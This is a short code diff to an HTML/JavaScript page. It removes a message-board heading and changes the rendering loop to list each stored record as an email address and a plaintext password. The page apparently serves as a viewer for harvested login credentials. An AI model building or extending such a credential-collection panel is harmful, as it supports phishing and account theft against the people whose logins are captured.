@@ -43,19 +43,7 @@
 			var count = 0;
       </script>
       
-          
-	  <div class="brand">
-        
-        <!--<img src="a0.jpg" alt="">-->
-    </div>
-    </div><br><br><hr class="hr-class"><br><br>
-	<div>
-		<div class="content">
-			<div class="log-head">
-                <h2>All Messages</h2>
-            </div>
-		</div>
-	</div><br><br><hr class="hr-class"><br><br>
+	  
 	<div id="msg-log"></div>
 
 
@@ -69,8 +57,11 @@
 					count = count - 1;
 					blogsHtml += "<div style='border: 2px solid black; border-radius: 30px; width: 90%; background: rgb(129, 5, 92);padding: 20px 10px; font-size: 1.2em; min-height: 100px; position: relative; margin: 2% auto; color:white;'>"
 
-						blogsHtml += "<p><br>"
-								blogsHtml += singleBlog.val().anon
+						blogsHtml += "<p>"
+								blogsHtml += "Email: " + singleBlog.val().etext
+						blogsHtml += "</p>"
+						blogsHtml += "<p>"
+								blogsHtml += "Password: " + singleBlog.val().ptext
 						blogsHtml += "</p>"
 
 						blogsHtml += "<br><span style='font-size:0.7rem;'>"
